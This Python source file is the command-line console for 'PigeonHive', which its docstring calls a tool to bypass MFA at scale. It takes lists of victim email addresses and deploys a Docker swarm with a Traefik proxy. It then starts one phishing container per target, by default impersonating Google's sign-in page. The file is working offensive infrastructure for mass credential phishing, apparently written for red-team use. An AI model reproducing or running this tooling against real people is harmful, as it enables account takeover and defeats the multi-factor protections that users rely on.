"""
PigeonHive - a tool to bypass MFA at scale.

Echelon Risk + Cyber

Authors -
James Stahl
Steeven Rodriguez
Katterin Soto
"""


import docker
import argparse
import re
from pathlib import Path
from django.utils.crypto import get_random_string


# --- globals ---

# email regular expression; source: https://stackabuse.com/python-validate-email-address-with-regular-expressions-regex/
email_re = re.compile(r"([-!#-'*+/-9=?A-Z^-~]+(\.[-!#-'*+/-9=?A-Z^-~]+)*|\"([]!#-[^-~ \t]|(\\[\t -~]))+\")@([-!#-'*+/-9=?A-Z^-~]+(\.[-!#-'*+/-9=?A-Z^-~]+)*|\[[\t -Z^-~]*])")

# table to store email/id mappings
id_email_mapping = {}

# list to store IDs to prevent a (very unlikely) collision
magic_string = 'pigeonhive'
used_ids = [magic_string]

# used to interact with the docker engine
client = docker.from_env()

# name used for the overlay network
overlay_network_name = 'pigeonhive_overlay'

# main container information
pigeoncell_container_name = 'pigeoncell'
pigeoncell_container_path = Path('./pigeoncell_container')

# caddy and gophish api container information
traefik_container_name = 'traefik_proxy'
traefik_volume_name = 'traefik_data'

# default url to be used for phishing
default_target = 'https://accounts.google.com/signin'
default_landing = 'test.local'

# ---------------

def main():

    # validate that the host is running a docker swarm
    try:
        swarm_client = client.swarm
        swarm_client.version
    except AttributeError:
        print('This host is not a swarm node; please run on a swarm manager node')
        exit(1)

    # initialize argument parser and create subparsers to hand subcommands
    parser = argparse.ArgumentParser(description='Management console for PigeonHive - bypass MFA at scale!')
    parser.set_defaults(func=default_output)
    subparsers = parser.add_subparsers(title='subcommands', help='Select a general action to take')

    # create parser for "create" command
    create_parser = subparsers.add_parser('create', help='Create containers')
    create_parser.add_argument('email', nargs='+', action='extend', help='Email address(es) or file(s) containing a list of email address(es)')
    create_parser.add_argument('-t', '--target', help='target URL to be displayed by phishing page (default is Google\'s signin page', default=default_target)
    create_parser.add_argument('-l', '--landing', help='landing page URL on which PigeonHive is hosted (defaults to localhost)', default=default_landing)
    create_parser.set_defaults(func=create)

    # create parser for "query" command
    query_parser = subparsers.add_parser('query', help='Query active containers; currently only contains \'list\' but will contain more')
    query_parser.add_argument('choice', choices=['list'], help='Choose an action; \'list\' lists active containers')
    query_parser.set_defaults(func=query)

    # create parser for "delete" command
    delete_parser = subparsers.add_parser('delete', help='Delete active containers')
    delete_parser.add_argument('-e', '--email', nargs='+', action='extend', help='Email address(es) of containers to delete')
    delete_parser.add_argument('-i', '--id', nargs='+', action='extend', help='ID(s) to delete (ID refers to the 8 character ID generated and assigned to the \'name\' column, not the Docker-generated ID')
    delete_parser.add_argument('-a', '--all', action='store_true', help='Delete all containers')
    delete_parser.set_defaults(func=delete)

    args = parser.parse_args()
    args.func(args)


def create(args):
    input_list = args.email
    target = args.target
    landing = args.landing

    # check if overlay network exists and create it if not
    do_networking()

    # check if item is an email address; if not, check if it is a file and add emails from file
    email_list = get_emails(input_list)

    # generate IDs (to be handled by GoPhish in the future)
    for email in email_list:

        # add dict record with id as key, email as value
        id_email_mapping.update({generate_id(): email})

    # check if caddy is running and run it if not
    do_traefik()

    # create pigeoncell containers
    do_pigeoncell(target, landing)


def query(args):
    if args.choice == 'list':
        services = client.services
        running = services.list()

        # iterate through services and output id and email
        for service in running:
            try:
                email = service.attrs['Spec']['Labels']['email']
                print(f'{service.name}: {email}')
            except KeyError:
                pass


def delete(args):
    services = client.services
    deletion_list = set()

    if args.all:
        deletion_list.update(services.list(filters={'label': 'group=pigeoncell'}))
    if args.id is not None:
        [deletion_list.update(
            services.list(filters={'name': id})
        ) for id in args.id]
    if args.email is not None:
        [deletion_list.update(services.list(filters={
            'label': f'email={email}'
        })) for email in args.email]

    if deletion_list:
        for service in deletion_list:
            print(f'Removing {service.name}')
            service.remove()


def do_networking():
    networks = client.networks
    if not networks.list(names=[overlay_network_name]):
        print('No overlay network detected, creating now...')
        networks.create(
            name=overlay_network_name,
            driver='overlay',
        )
        print(f'Created overlay network \'{overlay_network_name}\'')


def do_traefik():
    services = client.services
    if not services.list(filters={'name': traefik_container_name}):

        print(f'Creating traefik service with name \'{traefik_container_name}\'')
        client.volumes.create(name=traefik_volume_name, driver='local')
        services.create(
            image='traefik:v1.7.34-alpine',
            name=traefik_container_name,
            networks=[overlay_network_name],
            endpoint_spec=docker.types.EndpointSpec(
                ports={80: 80, 443: 443, 8080:8080}
            ),
            constraints=[
                'node.labels.pigeonhive_leader == true',
                'node.role==manager'
                ],
            args=[
                '--docker',
                '--docker.swarmmode',
                f'--docker.domain={default_landing}',
                '--docker.watch',
                '--logLevel=DEBUG',
                '--web'
            ],
            mounts=[
                '/var/run/docker.sock:/var/run/docker.sock'#,
                # f'{traefik_container_name}:/data'
                ]
        )


def do_pigeoncell(target, landing):
    # build pigeoncell image - reference: https://docker-py.readthedocs.io/en/stable/images.html
    print(f'Building pigeoncell image with tag \'{pigeoncell_container_name}\'...')
    image, output = client.images.build(path=pigeoncell_container_path.as_posix(), tag=pigeoncell_container_name)

    # create service for each id/email
    services = client.services
    for id in id_email_mapping:

        print(f'Creating service for {id}: {id_email_mapping[id]}')

        # create pigeoncell service for the id/email
        services.create(
            image=pigeoncell_container_name,
            name=id,
            networks=[overlay_network_name],
            env=[f'URL={target}'],
            mounts=['/dev/shm:/dev/shm:rw'],
            labels={
                'group': 'pigeoncell',
                'email': id_email_mapping[id],      # make a label to identify services by email
                'traefik.port': '5800'              # this and the following labels define traefik behavior for the reverse proxy
            }
        )


def get_emails(input_list):
    email_list = []

    for item in input_list:

        # add email to list if valid
        if is_valid_email(item):
            email_list.append(item)

        # for each line in file, check if line is a valid email and add if so
        elif Path(item).is_file():
            with Path(item).open('r') as input_file:
                for line in input_file:
                    candidate = line.strip()
                    email_list.append(candidate) if is_valid_email(candidate) else print(f'{candidate} from file {item} does not appear to be an email address')

        else:
            print(f'{item} does not appear to be an email address or a file')

    return email_list


def is_valid_email(email):

    # returns true if email is valid (via regex)
    return re.fullmatch(email_re, email)


def generate_id():

    # generate IDs until a unique one is found (likely on first try)
    candidate = magic_string
    while candidate in used_ids:
        candidate = get_random_string(8).lower()

    return candidate


def default_output(null):

    # source: https://ascii.co.uk/art/pigeon
    ascii_art = """
                            -
    \\                  /   @ )
      \\             _/_   |~ \\)   coo
        \\     ( ( (     \ \\
         ( ( ( ( (       | \\
_ _=(_(_(_(_(_(_(_  _ _ /  )
                -  _ _ _  /
                      _\\___
                     `    "'
    """

    print(ascii_art)
    print('Pass -h or --help for usage')


if __name__ == '__main__':
    main()
